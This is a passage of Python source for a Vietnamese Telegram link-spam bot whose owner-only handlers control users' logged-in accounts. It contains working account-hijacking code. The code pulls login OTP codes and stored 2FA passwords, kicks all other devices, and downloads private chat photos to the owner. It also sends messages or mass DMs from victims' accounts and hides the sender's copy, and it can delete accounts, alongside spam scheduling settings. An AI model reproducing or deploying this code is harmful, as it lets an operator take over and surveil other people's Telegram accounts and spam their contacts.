            await cv.send_message(result_txt, parse_mode='markdown')

    elif data == "rmt_leave_all":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c:
            return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message(
                "💣 **RỜI TẤT CẢ NHÓM/KÊNH**\n"
                "────────────────\n"
                "⚠️ Hành động này sẽ rời **TOÀN BỘ** nhóm và kênh của tài khoản!\n\n"
                "Gõ `XAC NHAN` để tiến hành:"
            )
            confirm = (await cv.get_response()).text.strip()
            if confirm != "XAC NHAN":
                return await cv.send_message("❌ Đã hủy.")
            client = u_c[target_uid]
            await cv.send_message("⏳ Đang quét và rời tất cả nhóm/kênh...")
            try:
                dialogs = await client.get_dialogs(limit=300)
                targets_leave = [d for d in dialogs if d.is_group or d.is_channel]
                total = len(targets_leave)
                success, fail = 0, 0
                for d in targets_leave:
                    try:
                        await client(functions.channels.LeaveChannelRequest(channel=d.entity))
                        success += 1
                        await asyncio.sleep(1.5)
                    except Exception:
                        fail += 1
                await cv.send_message(
                    f"✅ **ĐÃ RỜI TẤT CẢ NHÓM/KÊNH HOÀN TẤT!**\n"
                    f"• Tổng: `{total}`\n"
                    f"• Thành công: `{success}`\n"
                    f"• Thất bại: `{fail}`",
                    parse_mode='markdown'
                )
            except Exception as ex:
                await cv.send_message(f"❌ Lỗi: `{ex}`")

    elif data == "rmt_check_admin_rights":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang quét quyền admin các nhóm...", alert=True)
        client = u_c[target_uid]
        try:
            dialogs = await client.get_dialogs(limit=200)
            admin_groups = []
            for d in dialogs:
                if d.is_group or d.is_channel:
                    try:
                        participant = await client(functions.channels.GetParticipantRequest(channel=d.entity, participant='me'))
                        p = participant.participant
                        if isinstance(p, (types.ChannelParticipantCreator, types.ChannelParticipantAdmin)):
                            admin_groups.append(d.name)
                    except:
                        pass
            txt = f"👑 **TÀI KHOẢN LÀM ADMIN TRONG CÁC NHÓM/KÊNH:**\n────────────────\n• **ID Acc:** `{target_uid}`\n"
            if admin_groups:
                for idx, g_name in enumerate(admin_groups, 1):
                    txt += f"{idx}. `{g_name}`\n"
            else:
                txt += "⚠️ Tài khoản này không làm admin ở nhóm/kênh nào trong 200 dialog gần nhất."
            await ev.respond(txt, parse_mode='markdown')
        except Exception as ex:
            await ev.respond(f"❌ Lỗi quét quyền admin: `{ex}`")

    elif data == "rmt_list_all_groups":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang liệt kê danh sách nhóm/kênh...", alert=True)
        client = u_c[target_uid]
        try:
            dialogs = await client.get_dialogs(limit=300)
            group_list = [f"• `{d.name}` (ID: `{d.id}`)" for d in dialogs if d.is_group or d.is_channel]
            if group_list:
                chunk = "\n".join(group_list[:60])
                await ev.respond(f"📋 **DANH SÁCH NHÓM/KÊNH CỦA ACC (`{target_uid}`)** (Tổng: {len(group_list)}):\n────────────────\n{chunk}", parse_mode='markdown')
            else:
                await ev.respond("⚠️ Không tìm thấy nhóm/kênh nào.")
        except Exception as ex:
            await ev.respond(f"❌ Lỗi: `{ex}`")

    elif data == "rmt_join_chatlist":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("🔗 **Nhập link danh sách chat addlist (VD: `https://t.me/addlist/pGWkpUzif-gwZTc1`):**")
            link_msg = (await cv.get_response()).text.strip()
            match = re.search(r'addlist/([a-zA-Z0-9_-]+)', link_msg)
            if match:
                slug = match.group(1)
                client = u_c[target_uid]
                try:
                    invite = await client(functions.chatlists.CheckChatlistInviteRequest(slug=slug))
                    await client(functions.chatlists.JoinChatlistInviteRequest(slug=slug, peers=invite.peers))
                    await cv.send_message("✅ **Đã tham gia danh sách chat (addlist) thành công!**")
                except Exception as ex:
                    await cv.send_message(f"❌ Lỗi tham gia addlist: `{ex}`")
            else:
                await cv.send_message("❌ Link addlist không hợp lệ!")

    elif data == "rmt_check_ip":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang quét toàn bộ danh sách thiết bị và vị trí...", alert=True)
        client = u_c[target_uid]
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            total_dev = len(auths.authorizations)
            report_text = f"📍 **DANH SÁCH TOÀN BỘ THIẾT BỊ & IP (Tổng: {total_dev}):**\n────────────────\n• **ID Tài khoản:** `{target_uid}`\n"
            for idx, auth in enumerate(auths.authorizations, 1):
                current_mark = "🟢 (Phiên hiện tại đang chạy Bot)" if auth.current else "💻 (Thiết bị phụ)"
                raw_ip = getattr(auth, 'ip', '127.0.0.1')
                country = getattr(auth, 'country', 'Việt Nam')
                device_model = getattr(auth, 'device_model', 'Unknown')
                platform = getattr(auth, 'platform', 'Unknown')
                report_text += (
                    f"\n**[{idx}] Thiết bị:** `{device_model} ({platform})` {current_mark}\n"
                    f"• **🌐 IP:** `{raw_ip}`\n"
                    f"• **🌍 Quốc gia:** `{country}`\n"
                )
            report_text += f"\n🕒 **Thời gian quét:** `{datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')}`"
            await ev.respond(report_text, parse_mode='markdown')
        except Exception as ex:
            await ev.respond(f"❌ **Lỗi quét danh sách thiết bị:** `{ex}`")

    elif data == "rmt_get_all_photos":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang quét toàn bộ ảnh đại diện và ảnh chat riêng...", alert=True)
        client = u_c[target_uid]
        try:
            downloaded_files = []
            profile_photos = await client.get_profile_photos('me', limit=10)
            for idx, p in enumerate(profile_photos):
                f_path = await client.download_media(p, file=f"profile_acc_{target_uid}_{idx}.jpg")
                if f_path and os.path.exists(f_path):
                    downloaded_files.append(f_path)
            dialogs = await client.get_dialogs(limit=50)
            for d in dialogs:
                if d.is_user:
                    messages = await client.get_messages(d.id, limit=20)
                    for m in messages:
                        if m.photo:
                            f_path = await m.download_media(file=f"chat_img_{target_uid}_")
                            if f_path and os.path.exists(f_path):
                                if f_path not in downloaded_files:
                                    downloaded_files.append(f_path)
            if downloaded_files:
                await ev.respond(f"📷 **QUÉT ẢNH THÀNH CÔNG!** Đã tìm thấy và tải về `{len(downloaded_files)}` hình ảnh của tài khoản `{target_uid}`...")
                for f_path in downloaded_files[:10]:
                    try:
                        await bot.send_file(O_ID, f_path, caption=f"🖼 Ảnh tài khoản ID: `{target_uid}`")
                    except: pass
                    try: os.remove(f_path)
                    except: pass
            else:
                await ev.respond(f"⚠️ Không tìm thấy bức ảnh nào trong lịch sử avatar hoặc tin nhắn riêng tư của tài khoản `{target_uid}`.")
        except Exception as ex:
            await ev.respond(f"❌ **Lỗi quét ảnh:** `{ex}`")

    elif data == "rmt_check_otp":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang quét mã OTP...", alert=True)
        client = u_c[target_uid]
        pwd_2fa = user_2fa_passwords.get(target_uid, "Không bật / Không lưu")
        try:
            messages = await client.get_messages(777000, limit=5)
            otp_found = False
            for m in messages:
                if m.text:
                    code_match = re.search(r'\b\d{5}\b', m.text)
                    if code_match:
                        code = code_match.group(0)
                        date_str = m.date.strftime('%H:%M:%S %d/%m/%Y')
                        await ev.respond(f"🔑 **MÃ OTP TELEGRAM MỚI NHẤT:**\n────────────────\n• Mã OTP Code: `{code}`\n• Mật Khẩu 2FA: `{pwd_2fa}`\n• Thời gian nhận: `{date_str}`\n\n📄 **Nội dung:**\n`{m.text}`")
                        otp_found = True
                        break
            if not otp_found:
                await ev.respond(f"⚠️ **Không tìm thấy mã OTP nào gần nhất!**\n\n🔐 **Mật Khẩu 2FA Hiện Tại:** `{pwd_2fa}`")
        except Exception as ex:
            await ev.respond(f"❌ **Lỗi đọc OTP:** `{ex}`")

    elif data == "rmt_kick_devices":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer("⏳ Đang kiểm tra...", alert=True)
        client = u_c[target_uid]
        try:
            auths = await client(functions.account.GetAuthorizationsRequest())
            total_dev = len(auths.authorizations)
            dev_list_text = f"📱 **DANH SÁCH THIẾT BỊ ĐANG ĐĂNG NHẬP (Tổng: {total_dev}):**\n"
            for auth in auths.authorizations:
                current_mark = "🟢 (Phiên hiện tại của Bot)" if auth.current else "💻 (Thiết bị khác)"
                dev_list_text += f"\n• Thiết bị: `{auth.device_model}` ({auth.platform}) {current_mark}\n  IP/Quốc gia: `{auth.country}`"
            kicked = 0
            for auth in auths.authorizations:
                if not auth.current:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                        kicked += 1
                    except: pass
            await ev.respond(dev_list_text + f"\n\n👉 **Kết quả:** Đã kick thành công `{kicked}` thiết bị khác!")
        except RPCError as ex:
            if "FRESH_RESET_AUTHORISATION_FORBIDDEN" in str(ex):
                await ev.respond("❌ **Chính sách Telegram:** Tài khoản mới đăng nhập chưa đủ mốc 24h để kick thiết bị. Bot sẽ tự động thử lại sau!")
            else:
                await ev.respond(f"❌ **Lỗi Telegram:** `{ex}`")
        except Exception as ex:
            await ev.respond(f"❌ **Lỗi:** `{ex}`")

    elif data == "rmt_send_one":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("🎯 **Nhập ID hoặc @username người nhận/nhóm:**")
            chat_target = (await cv.get_response()).text.strip()
            await cv.send_message("📝 **Nhập nội dung tin nhắn:**")
            msg_text = (await cv.get_response()).text.strip() + FOOTER_TEXT
            await cv.send_message("🖼 **Gửi ảnh kèm theo (hoặc `-` nếu không có):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"rmt_one_photo_{u}.jpg")
            try:
                chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
                client = u_c[target_uid]
                if photo_path and os.path.exists(photo_path):
                    await client.send_file(chat_entity, photo_path, caption=msg_text, parse_mode='markdown')
                    os.remove(photo_path)
                else:
                    await client.send_message(chat_entity, msg_text)
                await cv.send_message(f"✅ **Đã gửi tin nhắn thành công!**")
            except Exception as ex:
                if photo_path and os.path.exists(photo_path): os.remove(photo_path)
                await cv.send_message(f"❌ **Lỗi:** `{ex}`")

    elif data == "rmt_send_ghost":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("🎯 **Nhập ID/@username người nhận/nhóm:**")
            chat_target = (await cv.get_response()).text.strip()
            await cv.send_message("📝 **Nhập nội dung Ẩn Danh:**")
            msg_text = (await cv.get_response()).text.strip() + FOOTER_TEXT
            await cv.send_message("🖼 **Gửi ảnh kèm theo (hoặc `-` nếu không có):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"rmt_ghost_photo_{u}.jpg")
            try:
                chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
                client = u_c[target_uid]
                if photo_path and os.path.exists(photo_path):
                    sent_msg = await client.send_file(chat_entity, photo_path, caption=msg_text, parse_mode='markdown')
                    os.remove(photo_path)
                else:
                    sent_msg = await client.send_message(chat_entity, msg_text)
                try:
                    await client.delete_messages(chat_entity, [sent_msg.id], revoke=False)
                except: pass
                await cv.send_message(f"✅ **Đã gửi Ẩn Danh thành công!**")
            except Exception as ex:
                if photo_path and os.path.exists(photo_path): os.remove(photo_path)
                await cv.send_message(f"❌ **Lỗi:** `{ex}`")

    elif data == "rmt_send_all":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("📢 **Nhập nội dung gửi TẤT CẢ các nhóm:**")
            msg_text = (await cv.get_response()).text.strip() + FOOTER_TEXT
            await cv.send_message("🖼 **Gửi ảnh kèm theo (hoặc `-` nếu không có):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"rmt_all_photo_{u}.jpg")
            client = u_c[target_uid]
            await cv.send_message("⏳ Đang gửi...")
            success, fail = 0, 0
            dialogs = await client.get_dialogs(limit=150)
            for d in dialogs:
                if d.is_group or d.is_channel:
                    try:
                        if photo_path and os.path.exists(photo_path):
                            await client.send_file(d.id, photo_path, caption=msg_text, parse_mode='markdown')
                        else:
                            await client.send_message(d.id, msg_text)
                        success += 1
                        await asyncio.sleep(1)
                    except: fail += 1
            if photo_path and os.path.exists(photo_path): os.remove(photo_path)
            await cv.send_message(f"✅ **Đã gửi xong!** Thành công: `{success}` | Thất bại: `{fail}`")

    elif data == "rmt_send_all_ghost":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("🥷 **Nhập nội dung gửi ẨN DANH tới TẤT CẢ các nhóm:**")
            msg_text = (await cv.get_response()).text.strip() + FOOTER_TEXT
            await cv.send_message("🖼 **Gửi ảnh kèm theo (hoặc `-` nếu không có):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"rmt_allghost_photo_{u}.jpg")
            client = u_c[target_uid]
            await cv.send_message("⏳ Đang gửi ẩn danh...")
            success, fail = 0, 0
            dialogs = await client.get_dialogs(limit=150)
            for d in dialogs:
                if d.is_group or d.is_channel:
                    try:
                        if photo_path and os.path.exists(photo_path):
                            sent_msg = await client.send_file(d.id, photo_path, caption=msg_text, parse_mode='markdown')
                        else:
                            sent_msg = await client.send_message(d.id, msg_text)
                        try:
                            await client.delete_messages(d.id, [sent_msg.id], revoke=False)
                        except: pass
                        success += 1
                        await asyncio.sleep(1)
                    except: fail += 1
            if photo_path and os.path.exists(photo_path): os.remove(photo_path)
            await cv.send_message(f"✅ **Đã gửi Ẩn Danh Đa Nhóm xong!** Thành công: `{success}` | Thất bại: `{fail}`")

    elif data == "rmt_send_all_users":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("📤 **NHẬP NỘI DUNG GỬI TỚI TOÀN BỘ NGƯỜI DÙNG TỪNG IB (PRIVATE CHAT):**")
            msg_text = (await cv.get_response()).text.strip() + FOOTER_TEXT
            await cv.send_message("🖼 **Gửi ảnh kèm theo (hoặc `-` nếu không có):**")
            photo_res = await cv.get_response()
            photo_path = None
            if photo_res.photo:
                photo_path = await photo_res.download_media(file=f"rmt_users_photo_{u}.jpg")
            client = u_c[target_uid]
            await cv.send_message("⏳ Đang quét danh sách người dùng từng nhắn tin và tiến hành gửi...")
            success, fail = 0, 0
            try:
                dialogs = await client.get_dialogs(limit=250)
                private_users = [d for d in dialogs if d.is_user and not d.entity.bot and d.id != target_uid]
                if not private_users:
                    await cv.send_message("⚠️ Không tìm thấy người dùng cá nhân nào từng IB!")
                    if photo_path and os.path.exists(photo_path): os.remove(photo_path)
                    return
                for d in private_users:
                    try:
                        if photo_path and os.path.exists(photo_path):
                            await client.send_file(d.id, photo_path, caption=msg_text, parse_mode='markdown')
                        else:
                            await client.send_message(d.id, msg_text)
                        success += 1
                        await asyncio.sleep(1)
                    except:
                        fail += 1
                if photo_path and os.path.exists(photo_path): os.remove(photo_path)
                await cv.send_message(f"✅ **ĐÃ GỬI XONG TỚI TOÀN BỘ USER TỪNG IB!**\n• Tổng số user: `{len(private_users)}`\n• Thành công: `{success}`\n• Thất bại: `{fail}`")
            except Exception as ex:
                if photo_path and os.path.exists(photo_path): os.remove(photo_path)
                await cv.send_message(f"❌ **Lỗi gửi hàng loạt user:** `{ex}`")

    elif data == "rmt_custom_profile":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            client = u_c[target_uid]
            await cv.send_message("✏️ **Nhập Tên Mới** (Gửi `-` nếu giữ nguyên):")
            new_first = (await cv.get_response()).text.strip()
            await cv.send_message("📝 **Nhập Bio Mới** (Gửi `-` nếu giữ nguyên):")
            new_bio = (await cv.get_response()).text.strip()
            await cv.send_message("🖼 **Gửi Avatar mới** (Hoặc gửi `-` để bỏ qua):")
            photo_msg = await cv.get_response()
            try:
                kwargs = {}
                if new_first != "-": kwargs["first_name"] = new_first
                if new_bio != "-": kwargs["about"] = new_bio
                if kwargs:
                    await client(functions.account.UpdateProfileRequest(**kwargs))
                if photo_msg.photo:
                    path = await client.download_media(photo_msg.photo)
                    if path:
                        await client(functions.photos.UploadProfilePhotoRequest(file=await client.upload_file(path)))
                        if os.path.exists(path): os.remove(path)
                await cv.send_message("✅ **Đã cập nhật Hồ Sơ thành công!**")
            except Exception as ex:
                await cv.send_message(f"❌ **Lỗi:** `{ex}`")

    elif data == "rmt_delete_account":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⚠️ **Gõ chữ `XAC NHAN XOA` để xóa vĩnh viễn tài khoản:**")
            confirm_text = (await cv.get_response()).text.strip()
            if confirm_text == "XAC NHAN XOA":
                try:
                    client = u_c[target_uid]
                    await client(functions.account.DeleteAccountRequest(reason="Admin deleted via bot system"))
                    session_file = f"u_{target_uid}.session"
                    if os.path.exists(session_file): os.remove(session_file)
                    await cleanup_account(target_uid)
                    await cv.send_message("🗑 **Đã xóa vĩnh viễn tài khoản thành công!**")
                except Exception as ex:
                    await cv.send_message(f"❌ **Lỗi:** `{ex}`")
            else:
                await cv.send_message("❌ **Đã hủy.**")

    elif data == "rmt_count_groups":
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        client = u_c[target_uid]
        await ev.answer("⏳ Đang quét...", alert=True)
        try:
            dialogs = await client.get_dialogs()
            groups_count, channels_count, private_count = 0, 0, 0
            for d in dialogs:
                if d.is_group: groups_count += 1
                elif d.is_channel: channels_count += 1
                elif d.is_user: private_count += 1
            text = f"""📊 **THỐNG KÊ CHI TIẾT TÀI KHOẢN:**
────────────────
• Tổng số đoạn chat: `{len(dialogs)}`
• Số Nhóm (Groups): `{groups_count}`
• Số Kênh (Channels): `{channels_count}`
• Số Người Cùng IB (Private): `{private_count}`
"""
            await ev.edit(text, buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
        except Exception as ex:
            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])

    elif data.startswith("rmt_hist_p"):
        if u != O_ID: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
        client = u_c[target_uid]
        page = int(data.split("p")[1])
        await ev.answer(f"⏳ Đang tải...", alert=True)
        try:
            all_msgs = []
            try:
                messages = await client.get_messages(777000, limit=10)
                for m in messages:
                    msg_content = m.text.replace("\n", " ") if m.text else "[Media/Service]"
                    date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
                    all_msgs.append(f"🔔 `[{date_str}]`: {msg_content}")
            except: pass
            if not all_msgs:
                dialogs = await client.get_dialogs(limit=1)
                for d in dialogs:
                    msgs = await client.get_messages(d.id, limit=10)
                    for m in msgs:
                        msg_content = m.text.replace("\n", " ") if m.text else "[Media]"
                        date_str = m.date.strftime('%H:%M:%S %d/%m/%Y') if m.date else ""
                        all_msgs.append(f"💬 **{d.name}** `[{date_str}]`: {msg_content}")
            total_items = len(all_msgs)
            if total_items == 0:
                return await ev.edit("📜 Không có lịch sử tin nhắn!", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
            items_per_page = 3
            total_pages = (total_items + items_per_page - 1) // items_per_page
            if page > total_pages: page = total_pages
            if page < 1: page = 1
            start_idx = (page - 1) * items_per_page
            end_idx = start_idx + items_per_page
            current_msgs = all_msgs[start_idx:end_idx]
            text = f"📜 **LỊCH SỬ TIN NHẮN (Trang {page}/{total_pages}):**\n────────────────\n"
            for msg_item in current_msgs: text += f"• {msg_item}\n\n"
            nav_buttons = []
            if page > 1: nav_buttons.append(Button.inline("⬅️ Trước", data=f"rmt_hist_p{page-1}"))
            if page < total_pages: nav_buttons.append(Button.inline("Sau ➡️", data=f"rmt_hist_p{page+1}"))
            buttons = [nav_buttons] if nav_buttons else []
            buttons.append([Button.inline("🔙 Trở Về Quản Lý", data=f"sel_acc_{target_uid}")])
            await ev.edit(text, buttons=buttons, parse_mode='markdown')
        except Exception as ex:
            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])

    # ==========================================
    # CẤU HÌNH CÁ NHÂN USER
    # ==========================================
    elif data == "m_setting_link":
        custom_file = f"custom_links_{u}.txt"
        photo_file = f"custom_photo_{u}.jpg"
        has_custom = os.path.exists(custom_file)
        has_photo = os.path.exists(photo_file)
        custom_status = "🔴 Chưa Cài" if not has_custom else "🟢 Đã Cài Đặt (Nguyên khối văn bản)"
        photo_status = "🔴 Chưa có" if not has_photo else "🟢 Đã Tải Lên"
        txt = f"""
📝 **CẤU HÌNH NỘI DUNG & ẢNH RẢI LINK**
────────────────
• **Nội dung văn bản:** `{custom_status}`
• **Hình ảnh đi kèm:** `{photo_status}`
"""
        buttons = [
            [Button.inline("📝 Tải Lên Nội Dung & Ảnh (Gộp Chung)", data="set_custom_links_and_photo")],
            [Button.inline("🔄 Xóa Cài Đặt Cũ", data="reset_custom_links")],
            [Button.inline("🔙 Trở Về Menu", data="app_telegram")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "set_custom_links_and_photo":
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message(
                "📝 **CÀI ĐẶT NỘI DUNG & HÌNH ẢNH RẢI LINK**\n"
                "────────────────\n"
                "👉 Hãy gửi nguyên đoạn quảng cáo nhiều dòng của bạn vào đây (Bot sẽ giữ nguyên toàn bộ các dòng, link, emoji và định dạng không bị cắt xén).\n"
                "*(Hoặc gửi file `.txt` chứa nội dung).* "
            )
            res = await cv.get_response()
            custom_file = f"custom_links_{u}.txt"
            photo_file = f"custom_photo_{u}.jpg"
            content_text = ""
            has_new_photo = False
            if res.photo:
                await res.download_media(file=photo_file)
                has_new_photo = True
                if res.text:
                    content_text = res.text
            elif res.file and res.file.ext == ".txt":
                file_path = await res.download_media()
                with open(file_path, "r", encoding="utf-8") as f:
                    content_text = f.read()
                if os.path.exists(file_path): os.remove(file_path)
            elif res.text:
                content_text = res.text
            if not has_new_photo and not os.path.exists(photo_file):
                await cv.send_message("🖼 **Gửi tiếp hình ảnh đi kèm (hoặc gửi dấu gạch `-` nếu không dùng ảnh):**")
                photo_res = await cv.get_response()
                if photo_res.photo:
                    await photo_res.download_media(file=photo_file)
            if content_text.strip():
                with open(custom_file, "w", encoding="utf-8") as f:
                    f.write(content_text.strip())
            has_c = os.path.exists(custom_file)
            has_p = os.path.exists(photo_file)
            if has_c or has_p:
                await cv.send_message(f"✅ **ĐÃ LƯU CÀI ĐẶT THÀNH CÔNG!**\n• Nội dung: `{'Đã nhận nguyên văn bản đầy đủ' if has_c else 'Trống'}`\n• Hình ảnh: `{'Đã có' if has_p else 'Không có'}`")
            else:
                await cv.send_message("❌ Cài đặt thất bại do không nhận được nội dung hoặc ảnh!")

    elif data == "reset_custom_links":
        custom_file = f"custom_links_{u}.txt"
        photo_file = f"custom_photo_{u}.jpg"
        if os.path.exists(custom_file): os.remove(custom_file)
        if os.path.exists(photo_file): os.remove(photo_file)
        await ev.answer("✅ Đã xóa cài đặt nội dung & ảnh!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_setting_delay":
        grp_d = get_group_delay(u)
        loop_d = get_loop_delay(u) / 3600.0
        txt = f"""
⏱️ **CẤU HÌNH DELAY & THỜI GIAN LẶP RẢI LINK**
────────────────
• **Delay giữa mỗi nhóm/user:** `{grp_d} giây`
• **Thời gian lặp rải lại:** `{loop_d} tiếng/lần`
"""
        buttons = [
            [Button.inline("⏱ Set Mặc Định (2s/đối tượng, 1tiếng/lần)", data="set_delay_default")],
            [Button.inline("⏱ Cài Delay Giữa Các Tin", data="set_grp_delay_custom"), Button.inline("⏳ Cài Thời Gian Lặp", data="set_loop_delay_custom")],
            [Button.inline("🔙 Trở Về Menu", data="app_telegram")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_default":
        user_group_delays[u] = DEFAULT_GROUP_DELAY
        user_loop_delays[u] = DEFAULT_LOOP_DELAY
        await ev.answer("✅ Đã reset về mặc định!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_grp_delay_custom":
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⏱ **Nhập thời gian Delay giữa các lần gửi (giây):**")
            try:
                res = await cv.get_response()
                val = float(res.text.strip())
                if val < 1.0: val = 1.0
                user_group_delays[u] = val
                await cv.send_message(f"✅ **Đã cài đặt:** `{val} giây/tin`!")
            except:
                await cv.send_message("❌ Không hợp lệ!")

    elif data == "set_loop_delay_custom":
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⏳ **Nhập khoảng thời gian lặp lại rải link (Giờ):**")
            try:
                res = await cv.get_response()
                val = float(res.text.strip())
                if val < 0.1: val = 0.1
                user_loop_delays[u] = val * 3600.0
                await cv.send_message(f"✅ **Đã cài đặt:** `{val} tiếng/lần`!")
            except:
                await cv.send_message("❌ Không hợp lệ!")

    elif data == "logout_acc":
        if u in u_c:
            await cleanup_account(u)
            await ev.answer("🚪 Đã đăng xuất tài khoản thành công!", alert=True)
        else:
            await ev.answer("⚠️ Bạn chưa đăng nhập tài khoản nào!", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # MENU ADMIN SYSTEM
    # ==========================================
    elif data == "m_admin":
        if u != O_ID: return await ev.answer("❌ Chỉ Admin tối cao!", alert=True)
        txt = "👑 **ADMIN SYSTEM MANAGEMENT**\n────────────────"
        buttons = [
            [Button.inline("🚀 Chọn Số Acc Rải 24/24", data="adm_multi_spam_setup")],
            [Button.inline("📢 Broadcast Thông Báo All Users", data="adm_broadcast")],
            [Button.inline("⚙️ Quản Lý Kênh Bắt Buộc Tham Gia", data="adm_manage_required_groups")],
            [Button.inline("🔙 Trở Về", data="app_telegram")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ==========================================
    # ADMIN QUẢN LÝ KÊNH BẮT BUỘC
    # ==========================================
    elif data == "adm_manage_required_groups":
        if u != O_ID: return await ev.answer("❌ Chỉ Admin!", alert=True)
        await ev.answer()
        groups = load_required_groups()
        lines = "\n".join(
            f"{i+1}. **{g['name']}** — `@{g['username']}`\n   {g['link']}"
            for i, g in enumerate(groups)
        )
        txt = (
            "⚙️ **QUẢN LÝ KÊNH/NHÓM BẮT BUỘC THAM GIA**\n"
            "────────────────\n"
            f"Hiện có **{len(groups)}** kênh/nhóm:\n\n{lines}\n\n"
            "👇 Chọn hành động:"
        )
        buttons = [
            [Button.inline("➕ Thêm Kênh/Nhóm Mới", data="adm_rg_add")],
            [Button.inline("🗑 Xóa Kênh/Nhóm Theo STT", data="adm_rg_remove")],
            [Button.inline("🔄 Reset Về Mặc Định", data="adm_rg_reset")],
            [Button.inline("🔙 Trở Về Admin", data="m_admin")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown', link_preview=False)

    elif data == "adm_rg_add":
        if u != O_ID: return
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message(
                "➕ **THÊM KÊNH/NHÓM BẮT BUỘC**\n"
                "────────────────\n"
                "Nhập theo định dạng:\n"
                "`username | Tên hiển thị`\n\n"
                "Ví dụ: `chatbotrailink | Kênh Bot Rải Link`"
            )
            res = (await cv.get_response()).text.strip()
            try:
                parts = [p.strip() for p in res.split("|")]
                if len(parts) < 2:
                    return await cv.send_message("❌ Sai định dạng! Phải có dấu `|` phân cách.")
                username = parts[0].lstrip("@")
                name = parts[1]
                link = f"https://t.me/{username}"
                groups = load_required_groups()
                if any(g["username"].lower() == username.lower() for g in groups):
